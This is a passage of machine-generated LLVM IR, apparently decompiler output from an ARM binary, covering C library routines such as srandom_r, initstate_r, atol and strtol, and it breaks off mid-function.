  store i32 %v0_13ef4, i32* %v2_13ef4, align 4
  br label %dec_label_pc_13f3c

dec_label_pc_13efc:                               ; preds = %entry
  %v2_13efc = load i32, i32* %arg1, align 4
  store i32 %v2_13efc, i32* %r2.global-to-local, align 4
  %v1_13f00 = add i32 %tmp, 4
  %v2_13f00 = inttoptr i32 %v1_13f00 to i32*
  %v3_13f00 = load i32, i32* %v2_13f00, align 4
  store i32 %v3_13f00, i32* %r0.global-to-local, align 4
  %v1_13f04 = inttoptr i32 %v2_13efc to i32*
  %v2_13f04 = load i32, i32* %v1_13f04, align 4
  store i32 %v2_13f04, i32* %r1.global-to-local, align 4
  %v1_13f08 = inttoptr i32 %v3_13f00 to i32*
  %v2_13f08 = load i32, i32* %v1_13f08, align 4
  %v4_13f08 = add i32 %v3_13f00, 4
  store i32 %v4_13f08, i32* %r0.global-to-local, align 4
  %v2_13f0c = add i32 %v2_13f08, %v2_13f04
  store i32 %v2_13f0c, i32* %r3.global-to-local, align 4
  store i32 %v2_13f0c, i32* %v1_13f04, align 4
  %v3_13f10 = load i32, i32* %r2.global-to-local, align 4
  %v4_13f10 = add i32 %v3_13f10, 4
  store i32 %v4_13f10, i32* %r2.global-to-local, align 4
  %v0_13f14 = load i32, i32* %ip.global-to-local, align 4
  %v1_13f14 = add i32 %v0_13f14, 16
  %v2_13f14 = inttoptr i32 %v1_13f14 to i32*
  %v3_13f14 = load i32, i32* %v2_13f14, align 4
  store i32 %v3_13f14, i32* %r1.global-to-local, align 4
  %v0_13f18 = load i32, i32* %r3.global-to-local, align 4
  %v3_13f18 = udiv i32 %v0_13f18, 2
  store i32 %v3_13f18, i32* %r3.global-to-local, align 4
  %v3_13f1c = icmp ult i32 %v4_13f10, %v3_13f14
  %v1_13f20 = load i32, i32* %r4.global-to-local, align 4
  %v2_13f20 = inttoptr i32 %v1_13f20 to i32*
  store i32 %v3_13f18, i32* %v2_13f20, align 4
  br i1 %v3_13f1c, label %dec_label_pc_13f2c, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_13efc
  %v1_13f24 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_13f24, i32* %r2.global-to-local, align 4
  %v0_13f34.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_13f2c:                               ; preds = %dec_label_pc_13efc
  %v0_13f2c = load i32, i32* %r0.global-to-local, align 4
  %v1_13f2c = load i32, i32* %r1.global-to-local, align 4
  %v3_13f2c = icmp ult i32 %v0_13f2c, %v1_13f2c
  br i1 %v3_13f2c, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_13f2c
  %v1_13f30 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_13f30, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_13f2c, %._crit_edge, %bb
  %v0_13f34 = phi i32 [ %v0_13f34.pre, %._crit_edge ], [ %v0_13f2c, %dec_label_pc_13f2c ], [ %v1_13f30, %bb ]
  %v1_13f34 = load i32, i32* %ip.global-to-local, align 4
  %v2_13f34 = add i32 %v1_13f34, 4
  %v3_13f34 = inttoptr i32 %v2_13f34 to i32*
  store i32 %v0_13f34, i32* %v3_13f34, align 4
  %v0_13f38 = load i32, i32* %r2.global-to-local, align 4
  %v1_13f38 = load i32, i32* %ip.global-to-local, align 4
  %v2_13f38 = inttoptr i32 %v1_13f38 to i32*
  store i32 %v0_13f38, i32* %v2_13f38, align 4
  br label %dec_label_pc_13f3c

dec_label_pc_13f3c:                               ; preds = %dec_label_pc_13ed8, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_13f40 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13f40, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_13f18, { 1, 0 }
  uselistorder i32 %v1_13eec, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_13f3c, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13f4c = load i32, i32* @r4, align 4
  store i32 %v3_13f4c, i32* %stack_var_-36, align 4
  %v1_13f50 = add i32 %tmp, 12
  %v2_13f50 = inttoptr i32 %v1_13f50 to i8*
  %v3_13f50 = load i8, i8* %v2_13f50, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_13f60 = load i8, i8* %v2_13f50, align 1
  %tmp33 = icmp ugt i8 %v3_13f50, 4
  br i1 %tmp33, label %.dec_label_pc_1400c_crit_edge, label %dec_label_pc_13f6c

.dec_label_pc_1400c_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_1400c

dec_label_pc_13f6c:                               ; preds = %entry
  %v0_13f6c = load i32, i32* @r0, align 4
  %v2_13f6c = icmp eq i32 %v0_13f6c, 0
  %v1_13f70 = add i32 %tmp, 8
  %v2_13f70 = inttoptr i32 %v1_13f70 to i32*
  %v3_13f70 = load i32, i32* %v2_13f70, align 4
  store i32 %v3_13f70, i32* %r6.global-to-local, align 4
  br i1 %v2_13f6c, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_13f6c
  store i32 1, i32* @r0, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_13f6c, %bb
  %v0_13f7c = phi i32 [ %v0_13f6c, %dec_label_pc_13f6c ], [ 1, %bb ]
  %v2_13f78 = icmp eq i8 %v3_13f60, 0
  %v2_13f7c = inttoptr i32 %v3_13f70 to i32*
  store i32 %v0_13f7c, i32* %v2_13f7c, align 4
  br i1 %v2_13f78, label %dec_label_pc_14008, label %dec_label_pc_13f84

dec_label_pc_13f84:                               ; preds = %bb23
  %v1_13f84 = add i32 %tmp, 13
  %v2_13f84 = inttoptr i32 %v1_13f84 to i8*
  %v3_13f84 = load i8, i8* %v2_13f84, align 1
  %v4_13f84 = sext i8 %v3_13f84 to i32
  store i32 %v4_13f84, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_13f90 = load i32, i32* @r0, align 4
  store i32 %v0_13f90, i32* %r4.global-to-local, align 4
  %v0_13f94 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13f94, i32* %r8.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v5_13fd425 = icmp sgt i8 %v3_13f84, 1
  br i1 %v5_13fd425, label %dec_label_pc_13fa0, label %dec_label_pc_13fd8

dec_label_pc_13fa0:                               ; preds = %dec_label_pc_13f84, %dec_label_pc_13fa0.dec_label_pc_13fa0_crit_edge
  %v1_13fb4 = phi i32 [ %v1_13fb4.pre, %dec_label_pc_13fa0.dec_label_pc_13fa0_crit_edge ], [ 2836, %dec_label_pc_13f84 ]
  %v1_13fa8 = phi i32 [ %v1_13fa8.pre, %dec_label_pc_13fa0.dec_label_pc_13fa0_crit_edge ], [ 16807, %dec_label_pc_13f84 ]
  %v0_13fa427 = phi i32 [ %v0_13fc8.pre, %dec_label_pc_13fa0.dec_label_pc_13fa0_crit_edge ], [ %v0_13f90, %dec_label_pc_13f84 ]
  %v1_13fc026 = phi i32 [ %v5_13fc0, %dec_label_pc_13fa0.dec_label_pc_13fa0_crit_edge ], [ %v0_13f94, %dec_label_pc_13f84 ]
  %v3_13fa0 = urem i32 %v0_13fa427, 127773
  %v2_13fa8 = mul i32 %v1_13fa8, %v3_13fa0
  %v2_13fb0 = sdiv i32 %v0_13fa427, 127773
  %v2_13fb4 = mul i32 %v1_13fb4, %v2_13fb0
  %v2_13fb8 = sub i32 %v2_13fa8, %v2_13fb4
  %v8_13fb8 = icmp slt i32 %v2_13fb8, 0
  %v2_13fbc = add i32 %v2_13fb8, 2147483647
  %v2_13fbc.v2_13fb8 = select i1 %v8_13fb8, i32 %v2_13fbc, i32 %v2_13fb8
  store i32 %v2_13fbc.v2_13fb8, i32* %r4.global-to-local, align 4
  %v2_13fc0 = add i32 %v1_13fc026, 4
  %v3_13fc0 = inttoptr i32 %v2_13fc0 to i32*
  store i32 %v2_13fbc.v2_13fb8, i32* %v3_13fc0, align 4
  %v4_13fc0 = load i32, i32* %r8.global-to-local, align 4
  %v5_13fc0 = add i32 %v4_13fc0, 4
  store i32 %v5_13fc0, i32* %r8.global-to-local, align 4
  %v0_13fc4.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_13fc4.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_13fc8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13fd0 = add i32 %v0_13fc4.pre, 1
  store i32 %v1_13fd0, i32* %r7.global-to-local, align 4
  %v5_13fd4 = icmp slt i32 %v0_13fc4.pre, %v1_13fc4.pre
  br i1 %v5_13fd4, label %dec_label_pc_13fa0.dec_label_pc_13fa0_crit_edge, label %dec_label_pc_13fc4.dec_label_pc_13fd8_crit_edge

dec_label_pc_13fa0.dec_label_pc_13fa0_crit_edge:  ; preds = %dec_label_pc_13fa0
  %v1_13fa8.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_13fb4.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13fa0

dec_label_pc_13fc4.dec_label_pc_13fd8_crit_edge:  ; preds = %dec_label_pc_13fa0
  %v0_13fe8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13fd8

dec_label_pc_13fd8:                               ; preds = %dec_label_pc_13fc4.dec_label_pc_13fd8_crit_edge, %dec_label_pc_13f84
  %v0_13fe8 = phi i32 [ %v0_13fe8.pre, %dec_label_pc_13fc4.dec_label_pc_13fd8_crit_edge ], [ %v0_13f94, %dec_label_pc_13f84 ]
  %v0_13fdc.lcssa = phi i32 [ %v1_13fc4.pre, %dec_label_pc_13fc4.dec_label_pc_13fd8_crit_edge ], [ %v4_13f84, %dec_label_pc_13f84 ]
  %v2_13fdc = mul i32 %v0_13fdc.lcssa, 10
  store i32 %v2_13fdc, i32* @r4, align 4
  %v0_13fe0 = load i32, i32* %r5.global-to-local, align 4
  %v1_13fe0 = add i32 %v0_13fe0, 14
  %v2_13fe0 = inttoptr i32 %v1_13fe0 to i8*
  %v3_13fe0 = load i8, i8* %v2_13fe0, align 1
  %v4_13fe0 = sext i8 %v3_13fe0 to i32
  %v2_13fe4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_13fe4, i32* %r7.global-to-local, align 4
  %v4_13fe8 = mul nsw i32 %v4_13fe0, 4
  %v5_13fe8 = add i32 %v0_13fe8, %v4_13fe8
  %v1_13fec = inttoptr i32 %v0_13fe0 to i32*
  store i32 %v5_13fe8, i32* %v1_13fec, align 4
  %v3_13fec = add i32 %v0_13fe0, 4
  %v4_13fec = inttoptr i32 %v3_13fec to i32*
  %v5_13fec = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_13fec, i32* %v4_13fec, align 4
  br label %dec_label_pc_13ff8

dec_label_pc_13ff4:                               ; preds = %dec_label_pc_13ff8
  %v0_13ffc = load i32, i32* %r5.global-to-local, align 4
  %v2_13ff4 = inttoptr i32 %v0_13ffc to i32*
  %v3_13ff4 = call i32 @__GI_random_r(i32* %v2_13ff4, i32 %v2_13fe4)
  br label %dec_label_pc_13ff8

dec_label_pc_13ff8:                               ; preds = %dec_label_pc_13fd8, %dec_label_pc_13ff4
  %v0_13ff8 = load i32, i32* @r4, align 4
  %v1_13ff8 = add i32 %v0_13ff8, -1
  store i32 %v1_13ff8, i32* @r4, align 4
  %v6_13ff8 = icmp slt i32 %v1_13ff8, 0
  br i1 %v6_13ff8, label %dec_label_pc_14008, label %dec_label_pc_13ff4

dec_label_pc_14008:                               ; preds = %dec_label_pc_13ff8, %bb23
  %v2_14010.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1400c

dec_label_pc_1400c:                               ; preds = %.dec_label_pc_1400c_crit_edge, %dec_label_pc_14008
  %v2_14010 = phi i32 [ %v3_13f4c, %.dec_label_pc_1400c_crit_edge ], [ %v2_14010.pre, %dec_label_pc_14008 ]
  %v1_14014 = phi i32 [ -1, %.dec_label_pc_1400c_crit_edge ], [ 0, %dec_label_pc_14008 ]
  store i32 %v2_14010, i32* @r4, align 4
  ret i32 %v1_14014

; uselistorder directives
  uselistorder i32 %v1_13ff8, { 1, 0 }
  uselistorder i32 %v0_13fe0, { 1, 0, 2 }
  uselistorder i32 %v0_13fc4.pre, { 1, 0 }
  uselistorder i32 %v5_13fc0, { 1, 0 }
  uselistorder i32 %v0_13fa427, { 1, 0 }
  uselistorder i32 %v0_13f94, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_1400c, { 1, 0 }
  uselistorder label %dec_label_pc_13ff8, { 1, 0 }
  uselistorder label %dec_label_pc_13fa0, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14018:
  %v0_14018 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14018, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_14018
  %v2_14018 = load i32, i32* @r7, align 4
  %v5_14018 = udiv i32 %v2_14018, 8
  %v6_14018 = and i32 %v5_14018, %arg1
  %v3_1401c = load i32, i32* @fp, align 4
  %v8_1401c = shl i32 %v6_14018, %v3_1401c
  %v9_1401c = and i32 %v8_1401c, %arg1
  %v2_14020 = load i32, i32* @sp, align 4
  %v8_14020 = shl i32 %v2_14020, %arg3
  %v9_14020 = and i32 %v8_14020, %arg2
  call void @__pseudo_branch(i32 %v9_14020)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14018, %bb
  %v10_14020 = phi i32 [ %arg1, %dec_label_pc_14018 ], [ %v9_1401c, %bb ]
  ret i32 %v10_14020

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_14024 = load i32, i32* @r4, align 4
  %v6_14024 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_14054, label %dec_label_pc_14044

dec_label_pc_14044:                               ; preds = %entry
  %v2_14044 = icmp ugt i32 %arg2, 254
  %v7_14044 = icmp eq i32 %arg2, 255
  %v2_14048 = xor i1 %v7_14044, true
  %v3_14048 = and i1 %v2_14044, %v2_14048
  br i1 %v3_14048, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_14044
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_14044, %bb
  %v1_140807 = phi i32 [ %v3_14024, %dec_label_pc_14044 ], [ 4, %bb ]
  %v2_1404c = xor i1 %v2_14044, true
  %v3_1404c = or i1 %v7_14044, %v2_1404c
  br i1 %v3_1404c, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_14054:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_1406c, label %dec_label_pc_1405c

dec_label_pc_1405c:                               ; preds = %dec_label_pc_14054
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_140dc

.thread10:                                        ; preds = %dec_label_pc_1405c
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_1406c:                               ; preds = %dec_label_pc_14054
  %v2_1406c = icmp ugt i32 %arg2, 62
  %v7_1406c = icmp eq i32 %arg2, 63
  %v2_14070 = xor i1 %v7_1406c, true
  %v3_14070 = and i1 %v2_1406c, %v2_14070
  br i1 %v3_14070, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_1406c
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_1406c, %bb23
  %v1_140806 = phi i32 [ %v3_14024, %dec_label_pc_1406c ], [ 2, %bb23 ]
  %v2_14074 = xor i1 %v2_1406c, true
  %v3_14074 = or i1 %v7_1406c, %v2_14074
  br i1 %v3_14074, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_1408c = phi i32 [ 3, %bb22 ], [ %v1_140807, %bb21 ], [ %v1_140806, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33968), i32* %r3.global-to-local, align 4
  %v4_14080 = mul i32 %v1_1408c, 4
  %v5_14080 = add i32 %v4_14080, add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33968)
  store i32 %v5_14080, i32* %r2.global-to-local, align 4
  %v1_14084 = add i32 %v4_14080, add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33948)
  %v2_14084 = inttoptr i32 %v1_14084 to i32*
  %v3_14084 = load i32, i32* %v2_14084, align 4
  store i32 %v3_14084, i32* %r1.global-to-local, align 4
  %v1_14088 = add i32 %tmp, 4
  store i32 %v1_14088, i32* @r6, align 4
  %v6_1408c = inttoptr i32 %v5_14080 to i32*
  %v7_1408c = load i32, i32* %v6_1408c, align 4
  store i32 %v7_1408c, i32* %r2.global-to-local, align 4
  %v4_14090 = mul i32 %v3_14084, 4
  %v5_14090 = add i32 %v4_14090, %v1_14088
  store i32 %v5_14090, i32* %r3.global-to-local, align 4
  %v2_14094 = add i32 %arg3, 16
  %v3_14094 = inttoptr i32 %v2_14094 to i32*
  store i32 %v5_14090, i32* %v3_14094, align 4
  %v0_14098 = load i32, i32* %r2.global-to-local, align 4
  %v1_14098 = trunc i32 %v0_14098 to i8
  %v2_14098 = load i32, i32* @r5, align 4
  %v3_14098 = add i32 %v2_14098, 14
  %v4_14098 = inttoptr i32 %v3_14098 to i8*
  store i8 %v1_14098, i8* %v4_14098, align 1
  %v0_1409c = load i32, i32* %r1.global-to-local, align 4
  %v1_1409c = trunc i32 %v0_1409c to i8
  %v2_1409c = load i32, i32* @r5, align 4
  %v3_1409c = add i32 %v2_1409c, 13
  %v4_1409c = inttoptr i32 %v3_1409c to i8*
  store i8 %v1_1409c, i8* %v4_1409c, align 1
  %v0_140a0 = load i32, i32* @r4, align 4
  %v1_140a0 = trunc i32 %v0_140a0 to i8
  %v2_140a0 = load i32, i32* @r5, align 4
  %v3_140a0 = add i32 %v2_140a0, 12
  %v4_140a0 = inttoptr i32 %v3_140a0 to i8*
  store i8 %v1_140a0, i8* %v4_140a0, align 1
  %v0_140a4 = load i32, i32* @r6, align 4
  %v1_140a4 = load i32, i32* @r5, align 4
  %v2_140a4 = add i32 %v1_140a4, 8
  %v3_140a4 = inttoptr i32 %v2_140a4 to i32*
  store i32 %v0_140a4, i32* %v3_140a4, align 4
  %v0_140a8 = load i32, i32* @r5, align 4
  store i32 %v0_140a8, i32* %r1.global-to-local, align 4
  %v0_140ac = load i32, i32* @r0, align 4
  %v2_140ac = inttoptr i32 %v0_140ac to i32*
  %v3_140ac = call i32 @srandom_r(i32* %v2_140ac, i32 %v0_140a8)
  store i32 %v3_140ac, i32* %r0.global-to-local, align 4
  %v0_140b0 = load i32, i32* @r4, align 4
  %v2_140b0 = icmp eq i32 %v0_140b0, 0
  br i1 %v2_140b0, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_140cc12 = load i32, i32* @r7, align 4
  %v2_140cc13 = inttoptr i32 %v1_140cc12 to i32*
  store i32 0, i32* %v2_140cc13, align 4
  %v1_140d0 = load i32, i32* @r4, align 4
  store i32 %v1_140d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_140f4

.thread4:                                         ; preds = %bb26
  %v1_140b4 = load i32, i32* @r5, align 4
  %v2_140b4 = add i32 %v1_140b4, 4
  %v3_140b4 = inttoptr i32 %v2_140b4 to i32*
  %v4_140b4 = load i32, i32* %v3_140b4, align 4
  %v1_140b8 = load i32, i32* @r6, align 4
  %v3_140b8 = sub i32 %v4_140b4, %v1_140b8
  %v4_140bc = sdiv i32 %v3_140b8, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_140c4 = mul i32 %v4_140bc, 5
  %v5_140c4 = add i32 %v4_140c4, %v0_140b0
  store i32 %v5_140c4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_140cc = load i32, i32* @r7, align 4
  %v2_140cc = inttoptr i32 %v1_140cc to i32*
  store i32 0, i32* %v2_140cc, align 4
  %v1_140d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_140d4 = load i32, i32* @r7, align 4
  %v3_140d4 = inttoptr i32 %v2_140d4 to i32*
  store i32 %v1_140d4, i32* %v3_140d4, align 4
  %v1_140fc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_140f4

dec_label_pc_140dc:                               ; preds = %dec_label_pc_1405c
  %v0_140dc = call i32 @__GI___errno_location()
  store i32 %v0_140dc, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_140e4 = inttoptr i32 %v0_140dc to i32*
  store i32 22, i32* %v2_140e4, align 4
  %v0_140e8 = call i32 @__GI___errno_location()
  %v0_140ec = load i32, i32* %r4.global-to-local, align 4
  %v2_140ec = inttoptr i32 %v0_140e8 to i32*
  store i32 %v0_140ec, i32* %v2_140ec, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_140f4

dec_label_pc_140f4:                               ; preds = %bb27, %.thread4, %dec_label_pc_140dc
  %v1_140fc = phi i32 [ %v1_140fc.pre, %.thread4 ], [ %v1_140d0, %bb27 ], [ -1, %dec_label_pc_140dc ]
  store i32 %v3_14024, i32* @r4, align 4
  store i32 %v6_14024, i32* @r5, align 4
  ret i32 %v1_140fc

; uselistorder directives
  uselistorder i1 %v7_1406c, { 1, 0 }
  uselistorder i1 %v7_14044, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33968), { 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %dec_label_pc_140f4, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_14118 = call i32 @strtol()
  ret i32 %v0_14118
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_14134 = call i32 @_stdlib_strto_l()
  ret i32 %v0_14134
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v0_14158 = load i32, i32* @r1, align 4
  store i32 %v0_14158, i32* %fp.global-to-local, align 4
  %v0_1415c = load i32, i32* @r2, align 4
  store i32 %v0_1415c, i32* %r5.global-to-local, align 4
  %v0_14160 = load i32, i32* @r0, align 4
  store i32 %v0_14160, i32* %r4.global-to-local, align 4
  %v0_14164 = load i32, i32* @r3, align 4
  br label %dec_label_pc_14170

dec_label_pc_1416c:                               ; preds = %dec_label_pc_14170
  %v1_1416c = add i32 %v0_141a8, 1
  store i32 %v1_1416c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14170

dec_label_pc_14170:                               ; preds = %entry, %dec_label_pc_1416c
  %v0_141a8 = phi i32 [ %v0_14160, %entry ], [ %v1_1416c, %dec_label_pc_1416c ]
  %v1_14170 = inttoptr i32 %v0_141a8 to i8*
  %v2_14170 = load i8, i8* %v1_14170, align 1
  %v3_14170 = zext i8 %v2_14170 to i32
  %v4_14174 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 1824) to i32*), align 4
  store i32 %v4_14174, i32* @r2, align 4
  %v2_14178 = mul nuw nsw i32 %v3_14170, 2
  %v2_1417c = add i32 %v2_14178, %v4_14174
  %v3_1417c = inttoptr i32 %v2_1417c to i16*
  %v4_1417c = load i16, i16* %v3_1417c, align 2
  %v1_14180 = and i16 %v4_1417c, 32
  %v2_14180 = icmp eq i16 %v1_14180, 0
  br i1 %v2_14180, label %dec_label_pc_14188, label %dec_label_pc_1416c

dec_label_pc_14188:                               ; preds = %dec_label_pc_14170
  %v7_14188 = icmp eq i8 %v2_14170, 43
  br i1 %v7_14188, label %dec_label_pc_141a8, label %dec_label_pc_14190

dec_label_pc_14190:                               ; preds = %dec_label_pc_14188
  %v7_14190 = icmp eq i8 %v2_14170, 45
  br i1 %v7_14190, label %dec_label_pc_141a8, label %bb

bb:                                               ; preds = %dec_label_pc_14190
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_141ac

dec_label_pc_141a8:                               ; preds = %dec_label_pc_14188, %dec_label_pc_14190
  %storemerge47 = phi i32 [ 1, %dec_label_pc_14190 ], [ 0, %dec_label_pc_14188 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_141a8 = add i32 %v0_141a8, 1
  store i32 %v1_141a8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_141ac

dec_label_pc_141ac:                               ; preds = %bb, %dec_label_pc_141a8
  %v0_141cc = phi i32 [ %v0_141a8, %bb ], [ %v1_141a8, %dec_label_pc_141a8 ]
  %v1_141ac = and i32 %v0_1415c, -17
  %v3_141ac = icmp eq i32 %v1_141ac, 0
  br i1 %v3_141ac, label %dec_label_pc_141b8, label %bb60

bb60:                                             ; preds = %dec_label_pc_141ac
  br label %bb64

dec_label_pc_141b8:                               ; preds = %dec_label_pc_141ac
  %v1_141b8 = inttoptr i32 %v0_141cc to i8*
  %v2_141b8 = load i8, i8* %v1_141b8, align 1
  %v7_141bc = icmp eq i8 %v2_141b8, 48
  %v1_141c0 = add i32 %v0_1415c, 10
  store i32 %v1_141c0, i32* %r5.global-to-local, align 4
  br i1 %v7_141bc, label %dec_label_pc_141cc, label %bb61

bb61:                                             ; preds = %dec_label_pc_141b8
  br label %.thread8

dec_label_pc_141cc:                               ; preds = %dec_label_pc_141b8
  %v1_141cc = add i32 %v0_141cc, 1
  %v2_141cc = inttoptr i32 %v1_141cc to i8*
  %v3_141cc = load i8, i8* %v2_141cc, align 1
  %v4_141cc = zext i8 %v3_141cc to i32
  store i32 %v1_141cc, i32* %r4.global-to-local, align 4
  %v1_141d0 = or i32 %v4_141cc, 32
  %v7_141d4 = icmp eq i32 %v1_141d0, 120
  %v1_141d8 = add i32 %v0_1415c, 8
  store i32 %v1_141d8, i32* %r5.global-to-local, align 4
  br i1 %v7_141d4, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_141cc
  %v3_141e4 = mul i32 %v1_141d8, 2
  store i32 %v3_141e4, i32* %r5.global-to-local, align 4
  %v2_141e8 = add i32 %v0_141cc, 2
  store i32 %v2_141e8, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_141cc, %bb61, %bb62
  %v1_142b430 = phi i32 [ %v0_14160, %bb61 ], [ %v1_141cc, %bb62 ], [ %v1_141cc, %dec_label_pc_141cc ]
  %v0_1423821 = phi i32 [ %v0_141cc, %bb61 ], [ %v2_141e8, %bb62 ], [ %v1_141cc, %dec_label_pc_141cc ]
  %v0_141ec = phi i32 [ %v1_141c0, %bb61 ], [ %v3_141e4, %bb62 ], [ %v1_141d8, %dec_label_pc_141cc ]
  %v5_141f0 = icmp slt i32 %v0_141ec, 16
  br i1 %v5_141f0, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
